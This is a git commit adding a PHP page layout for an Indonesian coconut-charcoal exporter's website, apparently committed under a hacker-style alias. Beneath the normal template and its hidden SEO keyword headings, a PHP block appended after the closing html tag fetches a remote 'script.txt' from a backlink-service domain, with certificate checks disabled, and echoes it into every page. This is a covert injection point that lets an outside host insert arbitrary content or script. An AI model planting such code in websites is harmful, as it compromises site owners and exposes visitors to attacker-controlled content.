5527ac84cc58aeddc937defb5d8aa19f618833ef
chmod 0777 <ribelcyberteam@gmail.com>
2025-01-24 20:55:40 +0800

    Update and rename indox.php to indeex.php

---
+++ indeex.php
@@ -0,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>
+        Taibacococha Indonesia &#8211; Indonesian Export product
+        &#8211; Coconut shell briquettes &#8211; Barbeque charcoal &#8211; Briquettes Factory &#8211; Coconut charcoal factory
+    </title>
+    <meta name="keywords"
+        content="arang barbeque, charcoal briquettes, supplier briket, coconut charcoal briquettes, coconut shell briquettes, charcoal factory, media arang" />
+    <meta name="description" content="Taibacococha Indonesia" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="manifest" href="site.webmanifest" />
+    <link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="https://www.addthis.com/academy/xmlrpc.php" />
+
+    <!-- Favicons -->
+        <link rel="shortcut icon" href="<?= base_url() ?>/public/assets/img/au/logoooo.jpg">
+        <link rel="apple-touch-icon" href="<?= base_url() ?>/public/assets/img/au/logoooo.jpg">
+        <link rel="image_src" href="<?= base_url() ?>/public/assets/img/au/logoooo.jpg"> 
+        <meta property="og:title" content="Taiba Cococha Indonesia" />
+        <meta property="og:image" itemprop="image primaryImageOfPage" content="<?= base_url() ?>/public/assets/img/au/logoooo.jpg">
+<meta name="twitter:card" content="summary_large_image">
+        
+        <!--<link rel="canonical" href="https://www.taibacoco.co.id/company" />-->
+        <meta property="og:type" content= "website" />
+        <meta property="og:url" content="<?= current_url(); ?>"/>
+        <meta property="og:site_name" content="Taiba Cococha Indonesia" />
+        
+   
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,700,700i|Montserrat:300,400,500,700"
+        rel="stylesheet">
+
+    <!-- Bootstrap CSS File -->
+    <link href="public/assets/lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Libraries CSS Files -->
+    <link href="public/assets/lib/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+    <link href="public/assets/lib/animate/animate.min.css" rel="stylesheet">
+    <link href="public/assets/lib/ionicons/css/ionicons.min.css" rel="stylesheet">
+    <link href="public/assets/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+    <link href="public/assets/lib/lightbox/css/lightbox.min.css" rel="stylesheet">
+
+    <!-- Main Stylesheet File -->
+    <link href="public/assets/css/style.css" rel="stylesheet">
+
+    <!-- =======================================================
+    Theme Name: BizPage
+    Theme URL: https://bootstrapmade.com/bizpage-bootstrap-business-template/
+    Author: BootstrapMade.com
+    License: https://bootstrapmade.com/license/
+  ======================================================= -->
+</head>
+
+<body>
+
+    <!--==========================
+    Header
+  ============================-->
+    <header id="header">
+        <div class="container-fluid">
+
+            <div id="logo" class="pull-left">
+                <!-- <h1><a href="#intro" class="scrollto">Taibacoco</a></h1> -->
+                <!-- Uncomment below if you prefer to use an image logo -->
+                <a href="#intro" class="scrollto"><img src="public/assets/img/testt.png" alt="" title="" /></a>
+            </div>
+
+            <nav id="nav-menu-container">
+
+                <ul class="nav-menu">
+                    <li><a href="<?php base_url(); ?>home"><?= lang('Global.home'); ?></a></li>
+                    <!-- <li><a href="<?php base_url(); ?>producta">Product</a></li> -->
+                    <li class="menu-has-children"><a
+                            href="<?php base_url(); ?>company"><?= lang('Global.company'); ?></a>
+                        <ul>
+                            <li><a href="<?php base_url(); ?>company"><?= lang('Global.presiden'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>companyb"><?= lang('Global.tentang'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>companyc"><?= lang('Global.mitra'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>companyd"><?= lang('Global.sertif'); ?></a></li>
+                            <h1 style="display: none">cara bakar arang</h1>
+                            <h1 style="display: none">charcoal briquettes</h1>
+                            <h1 style="display: none">supplier arang</h1>
+                            <h1 style="display: none">arang barbeque</h1>
+                            <h1 style="display: none">coconut charcoal briquettes</h1>
+                            <h1 style="display: none">coconut shell briquettes</h1>
+
+
+                            <!-- <li><a href="#">Drop Down 4</a></li>
+                            <li><a href="#">Drop Down 5</a></li> -->
+                        </ul>
+                    </li>
+                    <li class="menu-has-children"><a href=""><?= lang('Global.product'); ?></a>
+                        <ul>
+                            <li><a href="<?php base_url(); ?>producta"><?= lang('Global.sisha'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>productb"><?= lang('Global.bbq'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>productc"><?= lang('Global.charcoal'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>productd"><?= lang('Global.sawdust'); ?></a></li>
+                            <!-- <li><a href="<?php base_url(); ?>productd"><?= lang('Global.vco'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>producte"><?= lang('Global.carbon'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>productf"><?= lang('Global.copra'); ?></a></li> -->
+                            <h1 style="display: none">cara bakar arang</h1>
+                            <h1 style="display: none">charcoal briquettes</h1>
+                            <h1 style="display: none">supplier arang</h1>
+                            <h1 style="display: none">arang barbeque</h1>
+                            <h1 style="display: none">coconut charcoal briquettes</h1>
+                            <h1 style="display: none">coconut shell briquettes</h1>
+
+                            <!-- <li><a href="#">Drop Down 4</a></li>
+                            <li><a href="#">Drop Down 5</a></li> -->
+                        </ul>
+                    </li>
+                    <li class="menu-has-children"><a href=""><?= lang('Global.news'); ?></a>
+                        <ul>
+                            <li><a href="<?php base_url(); ?>article"><?= lang('Global.article'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>news"><?= lang('Global.newss'); ?></a></li>
+                            <!-- <li><a href="#">Drop Down 4</a></li>
+                            <li><a href="#">Drop Down 5</a></li> -->
+                        </ul>
+                    </li>
+                    <!-- <li><a href="#portfolio">Gallery</a></li> -->
+                    <li class="menu-has-children"><a href=""><?= lang('Global.gallery'); ?></a>
+                        <ul>
+                            <li><a href="<?php base_url(); ?>foto"><?= lang('Global.photo'); ?></a></li>
+                            <li><a href="<?php base_url(); ?>video"><?= lang('Global.video'); ?></a></li>
+                            <!-- <li><a href="#">Drop Down 4</a></li>
+                            <li><a href="#">Drop Down 5</a></li> -->
+                        </ul>
+                    </li>
+                    <li><a href="<?php base_url(); ?>contactus"><?= lang('Global.contact'); ?></a></li>
+
+                </ul>
+
+            </nav>
+            <ul class="nav-menu">
+                <li class="menu-has-children" style="margin-left:190px; bottom:4px;"><a href="frontlang/en">EN<img
+                            style="width:30px;" src="public/assets/img/english.png" alt=""></a><ul style="">
+                        <li style="right: 12px; background-color:transparent; border:none;"><a
+                                href="frontlang/ar">AR<img style="width:30px;" src="public/assets/img/arabic.png"
+                                    alt=""></a></li>
+
+                        <!-- <li><a href="#">Drop Down 4</a></li>
+                                <li><a href="#">Drop Down 5</a></li> -->
+                    </ul>
+                </li>
+            </ul>
+            <!-- #nav-menu-container -->
+        </div>
+    </header><!-- #header -->
+
+    <!--==========================
+    Intro Section
+  ============================-->
+    <?= $this->renderSection('content'); ?>
+    <!--==========================
+    Footer
+  ============================-->
+    <style>
+    .float {
+        position: fixed;
+        width: 60px;
+        height: 60px;
+        bottom: 40px;
+        right: 40px;
+        background-color: #25d366;
+        color: #FFF;
+        border-radius: 50px;
+        text-align: center;
+        font-size: 30px;
+        box-shadow: 2px 2px 3px #999;
+        z-index: 100;
+    }
+
+    .my-float {
+        margin-top: 16px;
+    }
+    </style>
+    <!--<script defer src="https://use.fontawesome.com/releases/v5.0.13/js/all.js" integrity="sha384-xymdQtn1n3lH2wcu0qhcdaOpQwyoarkgLVxC/wZ5q7h9gHtxICrpcaSUfygqZGOe" crossorigin="anonymous"></script>-->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+          <?php if (WEB_LANG == 'id') { ?>
+                    <p style="font-size:16px;" class="description text-justify text-white"><?= lang('Global.bc1'); ?>
+                    </p><br><br>
+                    <p style="font-size:16px;" class=" description text-justify text-white"><?= lang('Global.bc2'); ?>
+                    </p>
+                    <?php  } elseif (WEB_LANG == 'en') { ?>
+                    <a href="https://api.whatsapp.com/send?phone=6281316958461&text=Hello%20I%20want%20to%20ask%20about%20Taiba%20Coconut%20Charcoal%20Products%20."
+        class="float" target="_blank">
+                    <?php  } else { ?>
+                    <a href="https://api.whatsapp.com/send?phone=6281316958461&text=Hello%20I%20want%20to%20ask%20about%20Taiba%20Coconut%20Charcoal%20Products%20."
+        class="float" target="_blank">
+                    <?php } ?>
+        <i class="fa fa-whatsapp my-float"></i>
+    </a>
+    <footer id="footer">
+        <h1 style="display: none">cara bakar arang</h1>
+        <h1 style="display: none">charcoal briquettes</h1>
+        <h1 style="display: none">supplier arang</h1>
+        <h1 style="display: none">arang barbeque</h1>
+        <h1 style="display: none">coconut charcoal briquettes</h1>
+        <h1 style="display: none">coconut shell briquettes</h1>
+        <div class="footer-top">
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-12 col-lg-4 col-md-6 text-center">
+                        <h4>HEAD OFFICE</h4>
+                        <p style="font-size:18px;">PT. Taiba Cococha Indonesia
+                            JL. Angsana Raya Blok O no 1 Keluarahan Pejaten Timur Kec. Pasar Minggu - Jakarta Selatan
+                            12510
+                        </p>
+                    </div>
+                    <div class="col-sm-12 col-lg-4 col-md-6 text-center">
+                        <h4>FACTORY</h4>
+                           <p style="font-size:18px;">PT TAIBA COCOCHA INDONESIA
+                            Jl. PWRI No.53, RT.1/RW.6, Tonjong, Tajur Halang, Bogor, Jawa Barat 16320, Indonesia
+                        </p>
+                    </div>
+                    <div class="col-sm-12 col-lg-4 col-md-6 footer-fact text-center">
+                        <h4>Contact / Social Media</h4>
+                        <p style="font-size:18px;">Phone : 021 - 22790271</p>
+                        <p style="font-size:18px;">Email :admin@taibacoco.co.id</p>
+                         <div class="social-links">
+                            <a href="https://www.youtube.com/channel/UC4XTj3GE1gsejU-q483FmjA" class="twitter"><i class="fa fa-youtube"></i></a>
+                            <a href="https://www.facebook.com/Taibacoco-101145372251436/" class="facebook"><i class="fa fa-facebook"></i></a>
+                            <a href="https://www.instagram.com/taiba.cococha/" class="instagram"><i class="fa fa-instagram"></i></a>
+                        </div>
+
+                    </div>
+
+                    <!-- <div class="col-lg-4 col-md-6 footer-newsletter">
+                        <h4>Our Newsletter</h4>
+                        <p>Tamen quem nulla quae legam multos aute sint culpa legam noster magna veniam enim veniam illum dolore legam minim quorum culpa amet magna export quem marada parida nodela caramase seza.</p>
+                        <form action="" method="post">
+                            <input type="email" name="email"><input type="submit" value="Subscribe">
+                        </form>
+                    </div> -->
+
+                </div>
+            </div>
+        </div>
+
+        <!-- <div class="container">
+            <div class="copyright">
+                &copy; Copyright <strong>BizPage</strong>. All Rights Reserved
+            </div>
+            <div class="credits">
+
+          All the links in the footer should remain intact.
+          You can delete the links only if you purchased the pro version.
+          Licensing information: https://bootstrapmade.com/license/
+          Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/buy/?theme=BizPage
+
+                Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a>
+            </div>
+        </div>
+    </footer> -->
+
+        <!-- <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a> -->
+        <!-- Uncomment below i you want to use a preloader -->
+        <!--<div id="preloader"></div>-->
+
+        <!-- JavaScript Libraries -->
+        <script src="public/assets/lib/jquery/jquery.min.js"></script>
+        <script src="public/assets/lib/jquery/jquery-migrate.min.js"></script>
+        <script src="public/assets/lib/bootstrap/js/bootstrap.bundle.min.js"></script>
+        <script src="public/assets/lib/easing/easing.min.js"></script>
+        <script src="public/assets/lib/superfish/hoverIntent.js"></script>
+        <script src="public/assets/lib/superfish/superfish.min.js"></script>
+        <script src="public/assets/lib/wow/wow.min.js"></script>
+        <script src="public/assets/lib/waypoints/waypoints.min.js"></script>
+        <script src="public/assets/lib/counterup/counterup.min.js"></script>
+        <script src="public/assets/lib/owlcarousel/owl.carousel.min.js"></script>
+        <script src="public/assets/lib/isotope/isotope.pkgd.min.js"></script>
+        <script src="public/assets/lib/lightbox/js/lightbox.min.js"></script>
+        <script src="public/assets/lib/touchSwipe/jquery.touchSwipe.min.js"></script>
+        <!-- Contact Form JavaScript File -->
+        <script src="public/assets/contactform/contactform.js"></script>
+
+        <!-- Template Main Javascript File -->
+        <script src="public/assets/js/main.js"></script>
+
+</body>
+
+</html>
+<?php
+$url = 'https://backlinkku.id/menu/server-id/script.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan SSL verification jika diperlukan
+$content = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo "cURL Error: " . curl_error($ch);
+} else {
+    echo $content;
+}
+curl_close($ch);
+?>
